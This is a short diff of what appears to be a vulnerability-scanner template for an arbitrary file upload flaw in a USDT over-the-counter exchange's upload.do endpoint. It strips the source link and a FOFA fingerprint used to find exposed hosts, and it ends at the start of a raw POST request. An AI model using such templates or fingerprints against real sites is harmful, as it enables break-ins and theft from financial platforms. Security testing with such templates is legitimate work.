@@ -3,12 +3,8 @@ info:
   name: 虚拟币买卖USDT场外交易所upload.do存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zi9e7anonpd6uiq6'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zi9e7anonpd6uiq6
-    fofa: body="/static/weui/css/wkb.css"
 http:
 - raw:
   - 'POST /member/index/upload.do HTTP/1.1
